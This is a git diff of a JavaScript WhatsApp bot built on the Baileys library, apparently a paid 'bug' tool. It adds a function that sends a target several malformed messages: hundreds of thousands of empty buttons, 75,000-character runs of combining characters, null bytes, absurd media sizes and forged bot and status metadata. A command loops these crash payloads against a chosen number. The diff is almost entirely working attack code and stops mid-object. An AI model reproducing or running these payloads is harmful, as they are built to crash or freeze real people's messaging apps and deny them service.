@@ -286,7 +286,7 @@ const {
   BufferJSON,
   DisconnectReason,
   proto,
-} = require('@kxafunc/xbails');
+} = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const crypto = require('crypto');
 const chalk = require('chalk');
@@ -1672,11 +1672,11 @@ bot.command(["corblank"], checkWhatsAppConnection, checkPremium, async (ctx) => 
   });
 
   (async () => {
-    for (let i = 0; i < 40; i++) {
+    for (let i = 0; i < 30; i++) {
       await topsblank(sock, target);
       await PrivateNew2027V5(sock, target);
       await fefekpink(sock, target);
-      await PrivateNew2027(sock, target);
+      await fefekpink(sock, target);
       await sleep(1000);
       console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
     }
@@ -5126,6 +5126,826 @@ const b19 = {
   }
 };
 await sock.relayMessage(target, b19, {});
+}
+
+async function PrivateNew2027V3(sock, target) {
+  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
+  const generateId = () => Math.random().toString(36).substring(2, 15);
+
+  const generateWAMessageFromContent = (jid, message, options = {}) => {
+    return {
+      key: {
+        remoteJid: jid,
+        fromMe: true,
+        id: generateId()
+      },
+      message: message,
+      messageTimestamp: Date.now(),
+      pushName: "LexzyMods"
+    };
+  };
+
+  const LexMsg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+              mimetype: "image/jpeg",
+              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
+              fileLength: 9999,
+              height: 9999,
+              width: 9999,
+              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
+              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
+              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1776937541",
+              jpegThumbnail: null,
+              caption: "LexzyMods - Executed¿!",
+              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
+              scanLengths: [
+                9999999999999999999,
+                9999999999999999999,
+                9999999999999999999,
+                9999999999999999999
+              ],
+              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
+            }
+          },
+          body: {
+            text: "Iniochamy - Executed¿!"
+          },
+          nativeFlowMessage: {
+            buttons: Array.from({ length: 500000 }, () => ({}))
+          }
+        }
+      }
+    }
+  };
+
+  const Lexca = generateWAMessageFromContent(target, LexMsg, {});
+
+  await sock.relayMessage(target, Lexca.message, {
+    participant: true,
+    messageId: Lexca.key.id
+  });
+
+  const Lexcaa = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "Lexcaabos - Executed¿!"
+          },
+          nativeFlowMessage: {
+            buttons: Array.from({ length: 500000 }, () => ({}))
+          }
+        }
+      }
+    }
+  };
+
+  const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});
+
+  await sock.relayMessage(target, Lexcaabos.message, {
+    participant: true,
+    messageId: Lexcaabos.key.id
+  });
+
+  const msg = {
+    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
+    message: {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
+        mimetype: "image/jpeg",
+        caption: "iniochamy¿!",
+        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+        fileLength: 9999999,
+        height: 9999,
+        width: 9999,
+        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
+        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1776937541",
+        jpegThumbnail: largeThumbnail,
+        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
+        scanLengths: [
+          2899999999999999077,
+          1799999999999998555,
+          7699999999999999148,
+          1069999999999999164
+        ],
+        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
+        contextInfo: {
+          pairedMediaType: "RICH_TEXT_MESSAGE",
+          isQuestion: true,
+          isGroupStatus: false,
+          remoteJid: "1234567890-987654321@g.us",
+          entryPointConversionDelaySeconds: 120,
+          entryPointConversionSource: "group_chat"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    statusJidList: [target],
+    messageId: msg.key.id,
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{
+          tag: "to",
+          attrs: { jid: target },
+          content: undefined
+        }]
+      }]
+    }]
+  });
+
+  await sock.relayMessage(target, {
+    statusMentionMessage: {
+      message: {
+        protocolMessage: {
+          key: msg.key,
+          type: 25
+        },
+        additionalNodes: [{
+          tag: "meta",
+          attrs: { is_status_mention: "false" },
+          content: undefined
+        }]
+      }
+    }
+  }, {});
+
+  await sock.relayMessage(target, {
+    statusMentionMessage: {
+      message: {
+        protocolMessage: {
+          key: msg.key,
+          type: 25
+        }
+      }
+    }
+  }, {});
+
+  const a = {
+    interactiveMessage: {
+      header: {
+        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
+        hasMediaAttachment: true
+      },
+      body: {},
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "order_status",
+            buttonParamsJson: `{
+  \"currency\":\"IDR\",
+  \"total_amount\":{\"value\":0,\"offset\":100},
+  \"reference_id\":\"${"NanasPrivate" + "ြ".repeat(75000)}\",
+  \"type\":\"physical-goods\",
+  \"order\":{
+    \"status\":\"pending\",
+    \"order_type\":\"PAYMENT_REQUEST\",
+    \"items\":[
+      {
+        \"name\":\"${"LexzyMods" + "ြ".repeat(75000)}\",
+        \"quantity\":-9,
+        \"price\":{\"value\":0,\"offset\":100}
+      }
+    ]
+  }
+}`
+          }
+        ],
+        messageParamsJson: ""
+      },
+      contextInfo: {
+        forwardingScore: 9999,
+        isForwarded: true,
+        pairedMediaType: "NOT_PAIRED_MEDIA"
+      }
+    }
+  };
+
+  await sock.relayMessage(target, a, {});
+
+  const b = {
+    stickerPackMessage: {
+      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+      name: "ꦾ".repeat(75000),
+      publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
+      stickers: [],
+      fileLength: "366299919",
+      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
+      contextInfo: {
+        remoteJid: "X",
+        participant: "0@s.whatsapp.net",
+        stanzaId: "1234567890ABCDEF",
+        mentionedJid: ["13135555555@s.whatsapp.net"]
+      },
+      packDescription: "",
+      mediaKeyTimestamp: "1747502082",
+      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
+      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
+      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+      thumbnailHeight: 999999999,
+      thumbnailWidth: 9999999999,
+      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+      stickerPackSize: "9990099",
+      stickerPackOrigin: "USER_CREATED"
+    }
+  };
+
+  await sock.relayMessage(target, b, {});
+
+  const c = {
+    ephemeralMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: "Students Func Nanas",
+            locationMessage: {
+              degreesLatitude: -999.03499999999999,
+              degreesLongitude: 922.9999999999999,
+              name: "LexzyMods",
+              address: "X",
+              jpegThumbnail: null,
+            },
+            hasMediaAttachment: true,
+          },
+          body: {
+            text: "LexzyMods - Executed¿!",
+          },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: "ြ ".repeat(9000),
+              },
+              {
+                name: "address_message",
+                buttonParamsJson: "ြ ".repeat(9000),
+              },
+              {
+                name: "galaxy_message",
+                buttonParamsJson: "ြ ".repeat(75000),
+              },
+            ],
+            messageParamsJson: "wa.me/stickerpack/LexzyMods",
+            messageVersion: 1,
+          },
+        },
+      },
+    },
+  };
+
+  await sock.relayMessage(target, c, {});
+
+  const d = {
+    groupStatusMessageV2: {
+      message: {
+        videoMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
+          mimetype: "video/mp4",
+          caption: "LexzyMods - Executed¿!",
+          fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
+          fileLength: "1099511627776",
+          seconds: 172800,
+          mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
+          height: 1080,
+          width: 1920,
+          fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
+          directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1774428565",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
+          annotations: [
+            {
+              polygonVertices: [
+                {
+                  x: 0.17499999701976776,
+                  y: 0.3379453122615814
+                },
+                {
+                  x: 0.824999988079071,
+                  y: 0.3379453122615814
+                },
+                {
+                  x: 0.824999988079071,
+                  y: 0.6620468497276306
+                },
+                {
+                  x: 0.17499999701976776,
+                  y: 0.6620468497276306
+                }
+              ],
+              shouldSkipConfirmation: true,
+              embeddedContent: {
+                embeddedMusic: {
+                  musicContentMediaId: "2261401457948346",
+                  songId: "849859527815275",
+                  author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
+                  title: "ြ".repeat(75000),
+                  artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
+                  artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
+                  artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
+                  artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
+                  artistAttribution: "https://www.instagram.com/_u/lexzymods",
+                  countryBlocklist: "WEs=",
+                  isExplicit: false
+                }
+              },
+              embeddedAction: true
+            }
+          ]
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, d, {});
+
+  const bot = "867051314767696@bot";
+
+  const e = {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+
+          submessages: [
+            {
+              messageType: 2,
+              messageText: `@${bot.split("@")[0]}`
+            },
+
+            {
+              messageType: 5,
+              codeMetadata: {
+                codeLanguage: "javascript",
+
+                codeBlocks: [
+                  {
+                    highlightType: 1,
+                    codeContent: "const = {"
+                  },
+                  {
+                    highlightType: 2,
+                    codeContent: "Lexcaabos - Executed¿!"
+                  },
+                  {
+                    highlightType: 3,
+                    codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
+                  }
+                ]
+              }
+            }
+          ],
+
+          contextInfo: {
+            mentionedJid: [bot],
+
+            featureEligibilities: Array.from(
+              { length: 1999 },
+              () => ({
+                canReceiveMultiReact: true
+              })
+            ),
+
+            isForwarded: true,
+
+            forwardedAiBotMessageInfo: {
+              botJid: bot
+            },
+
+            forwardOrigin: 4
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, e, {});
+
+  const g = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+              mimetype: "image/jpeg",
+              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
+              fileLength: 9999,
+              height: 9999,
+              width: 9999,
+              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
+              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
+              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1776937541",
+              jpegThumbnail: null,
+              caption: "LexzyMods - Executed¿!",
+              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
+              scanLengths: [
+                9999987899999999999999,
+                998999999999999999999,
+                999899999999999999999,
+                9998789999999999999999
+              ],
+              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
+            }
+          },
+          body: {
+            text: "Lexcaabos - Executed¿!",
+          },
+          nativeFlowMessage: {
+            buttons: Array.from({ length: 450000 }, () => ({}))
+          }
+        }
+      }
+    }
+  };
+
+  const gMsg = generateWAMessageFromContent(target, g, {});
+
+  await sock.relayMessage(target, gMsg.message, {
+    participant: true,
+    messageId: gMsg.key.id
+  });
+
+  const f = {
+    newsletterAdminInviteMessage: {
+      newsletterJid: "228773882@newsletter",
+      newsletterName: "NanasMuda" + "ြ".repeat(75000),
+      caption: "Pt Func Tergacorr" + "ြ".repeat(50000),
+      inviteExpiration: Date.now() + 1814400000,
+      contextInfo: {
+        mentionedJid: [
+          "0@s.whatsapp.net",
+          ...Array.from(
+            { length: 1900 },
+            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+            ),
+            ],
+            remoteJid: "X",
+            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+            stanzaId: "123",
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 3,
+                expiryTimestamp: Date.now() + 1814400000
+              },
+              forwardedAiBotMessageInfo: {
+                botName: "META AI",
+                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+                creatorName: "Lexzy Ganteng"
+              }
+            }
+      },
+    },
+  };
+
+  await sock.relayMessage(target, f, {
+    participant: true,
+  });
+
+  const tombol = [
+      {
+          name: "single_select",
+          buttonParamsJson: "ြ ".repeat(9000),
+      },
+  ];
+      tombol.push(
+          {
+              name: "cta_call",
+              buttonParamsJson: JSON.stringify({
+                  display_text: "ꦽ".repeat(5000),
+              }),
+          },
+          {
+              name: "galaxy_message",
+              buttonParamsJson: JSON.stringify({
+                  display_text: "ꦽ".repeat(5000),
+              }),
+          },
+          {
+              name: "cta_copy",
+              buttonParamsJson: JSON.stringify({
+                  display_text: "ꦽ".repeat(5000),
+              }),
+          }
+      );
+
+  const i = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
+            hasMediaAttachment: true,
+          },
+          body: {
+            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
+          },
+          footer: {
+            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
+          },
+          nativeFlowMessage: {
+            buttons: tombol
+          },
+          contextInfo: {
+            forwardingScore: 2147483647,
+            isForwarded: true,
+            isSampled: true,
+            expireAt: 253402300799000,
+            participant: target,
+            remoteJid: "status@broadcast",
+            stanzaId: "ြ".repeat(10000),
+            deviceListMetadata: {
+              senderKeyHash: "ြ".repeat(7000),
+              senderTimestamp: "9999999999999",
+              recipientKeyHash: "ြ".repeat(6000),
+              recipientTimestamp: "8888888888888",
+              userIdentity: "ြ".repeat(4000)
+            },
+            botInvocationMetadata: {
+              botId: "exploit_bot@",
+              invocationType: "BOT_INVOCATION_TYPE_QUERY",
+              invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
+              botMessageSecret: "ြ".repeat(4000)
+            },
+            quotedMessage: {
+              extendedTextMessage: {
+                text: "\x10".repeat(1000),
+                contextInfo: {
+                  forwardingScore: 999999,
+                  isForwarded: true,
+                  stanzaId: "ꦽ".repeat(10000),
+                  participant: "0@s.whatsapp.net",
+                  remoteJid: "status@broadcast",
+                  deviceListMetadata: {
+                    senderKeyHash: "ꦽ".repeat(1000),
+                    recipientKeyHash: "ꦽ".repeat(1000)
+                  }
+                }
+              }
+            },
+            conversionSource: "ꦽ".repeat(9000),
+            conversionData: Buffer.from("ꦽ".repeat(1000)),
+            conversionDelaySeconds: 2147483647,
+            externalAdReply: {
+              title: "ꦽ".repeat(2000),
+              body: "ꦽ".repeat(2000),
+              mediaType: "IMAGE",
+              thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
+              mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+              sourceUrl: "t.me/LexzyModss",
+            }
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, i, {
+    participant: true,
+    messageId: generateId()
+  });
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+              mimetype: "image/jpeg",
+              caption: "LexzyMods - Executed¿!",
+              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
+              fileLength: "634893",
+              height: 1022,
+              width: 1080,
+              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
+              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
+              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+              mediaKeyTimestamp: "1782643133",
+              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
+              hasMediaAttachment: true
+            }
+          },
+          body: {
+            text: "\u0000",
+          },
+          nativeFlowMessage: {
+            buttons: "[".repeat(7500),
+          }
+        }
+      }
+    }
+  }, { participant: true })
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+              mimetype: "image/jpeg",
+              caption: "iniochamy - Executed¿!",
+              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
+              fileLength: "634893",
+              height: 1022,
+              width: 1080,
+              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
+              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
+              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+              mediaKeyTimestamp: "1782643133",
+              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
+              hasMediaAttachment: true
+            }
+          },
+          body: {
+            text: "\u200B",
+          },
+          nativeFlowMessage: {
+            buttons: "]".repeat(9000),
+          }
+        }
+      }
+    }
+  }, { participant: true })
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          header: {
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+              mimetype: "image/jpeg",
